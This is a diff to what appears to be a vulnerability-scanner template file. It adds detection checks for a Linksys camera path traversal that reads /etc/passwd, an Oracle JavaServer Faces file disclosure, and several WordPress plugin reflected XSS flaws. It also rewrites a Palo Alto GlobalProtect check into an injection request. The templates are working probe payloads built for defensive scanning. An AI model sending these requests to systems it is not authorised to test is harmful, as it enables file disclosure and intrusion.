@@ -214,6 +214,40 @@
       ]
     },
     {
+      "id": "CVE-2009-1558",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in adm/file.cgi on the Cisco Linksys WVC54GCA wireless video camera with firmware 1.00R22 and 1.00R24 allows remote attackers to read arbitrary files via a %2e. (encoded dot dot) or an absolute pathname in the next_file parameter.",
+        "name": "Linksys WVC54GCA 1.00R22/1.00R24 (Wireless-G) - Directory Traversal",
+        "reference": "https://www.exploit-db.com/exploits/32954",
+        "severity": "high",
+        "tags": "cve,cve2009,iot,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/adm/file.cgi?next_file=%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-4223",
       "info": {
         "author": "geeknik",
@@ -1277,6 +1311,52 @@
       ]
     },
     {
+      "id": "CVE-2013-3827",
+      "info": {
+        "author": "Random-Robbie",
+        "description": "Unspecified vulnerability in the Oracle GlassFish Server component in Oracle Fusion Middleware 2.1.1, 3.0.1, and 3.1.2; the Oracle JDeveloper component in Oracle Fusion Middleware 11.1.2.3.0, 11.1.2.4.0, and 12.1.2.0.0; and the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0 and 12.1.1 allows remote attackers to affect confidentiality via unknown vectors related to Java Server Faces or Web Container.",
+        "name": "Javafaces LFI",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2013-3827\n- https://www.exploit-db.com/exploits/38802\n",
+        "severity": "medium",
+        "tags": "cve,cve2013,lfi,javafaces,oracle"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<web-app",
+                "</web-app>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/costModule/faces/javax.faces.resource/web.xml?loc=../WEB-INF",
+            "{{BaseURL}}/costModule/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..",
+            "{{BaseURL}}/faces/javax.faces.resource/web.xml?loc=../WEB-INF",
+            "{{BaseURL}}/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..",
+            "{{BaseURL}}/secureader/javax.faces.resource/web.xml?loc=../WEB-INF",
+            "{{BaseURL}}/secureader/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..",
+            "{{BaseURL}}/myaccount/javax.faces.resource/web.xml?loc=../WEB-INF",
+            "{{BaseURL}}/myaccount/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..",
+            "{{BaseURL}}/SupportPortlet/faces/javax.faces.resource/web.xml?loc=../WEB-INF",
+            "{{BaseURL}}/SupportPortlet/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.."
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2013-4117",
       "info": {
         "author": "daffainfo",
@@ -2188,6 +2268,340 @@
       ]
     },
     {
+      "id": "CVE-2016-1000128",
+      "info": {
+        "author": "daffainfo",
+        "name": "anti-plagiarism <= 3.60 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000128",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/anti-plagiarism/js.php?m=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000129",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin defa-online-image-protector v3.3",
+        "name": "defa-online-image-protector <= 3.3 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000129",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/defa-online-image-protector/redirect.php?r=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000130",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin e-search v1.0",
+        "name": "e-search <= 1.0 - Reflected Cross-Site Scripting (XSS) via date_select.php",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000130",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/e-search/tmpl/date_select.php?date-from=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000131",
+      "info": {
+        "author": "daffainfo",
+        "name": "e-search <= 1.0 - Reflected Cross-Site Scripting (XSS) via title_az.php",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000131",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/e-search/tmpl/title_az.php?title_az=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000132",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin enhanced-tooltipglossary v3.2.8",
+        "name": "enhanced-tooltipglossary v3.2.8 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000132",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&msg=imported"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000133",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin forget-about-shortcode-buttons v1.1.1",
+        "name": "forget-about-shortcode-buttons 1.1.1 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000133",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/forget-about-shortcode-buttons/assets/js/fasc-buttons/popup.php?source=1&ver=1%22%20%3C%2Fscript%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000134",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin hdw-tube v1.2",
+        "name": "HDW WordPress Video Gallery <= 1.2 - Reflected Cross-Site Scripting (XSS) via playlist.php",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000134",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/hdw-tube/playlist.php?playlist=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000135",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin hdw-tube v1.2",
+        "name": "HDW WordPress Video Gallery <= 1.2 - Reflected Cross-Site Scripting (XSS) via mychannel.php",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000135",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/hdw-tube/mychannel.php?channel=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-10033",
       "info": {
         "author": "princechaddha",
@@ -3065,20 +3479,20 @@
     {
       "id": "CVE-2017-15944",
       "info": {
-        "author": "emadshanab",
+        "author": "emadshanab,milo2012",
         "name": "PreAuth RCE on Palo Alto GlobalProtect",
-        "reference": "http://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html",
+        "reference": "- https://www.exploit-db.com/exploits/43342\n- http://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html\n",
         "severity": "high",
-        "tags": "cve,cve2017,rce,vpn,paloalto"
+        "tags": "cve,cve2017,rce,vpn,paloalto,globalprotect"
       },
       "requests": [
         {
           "matchers": [
             {
-              "part": "header",
+              "part": "body",
               "type": "word",
               "words": [
-                "Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT"
+                "@start@Success@end@"
               ]
             },
             {
@@ -3089,9 +3503,8 @@
             }
           ],
           "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/global-protect/portal/css/login.css"
+          "raw": [
+            "GET /esp/cms_changeDeviceContext.esp?device=aaaaa:a%27\";user|s.\"1337\"; HTTP/1.1\nHost: {{Hostname}}\nCookie: PHPSESSID={{randstr}};\n"
           ]
         }
       ]
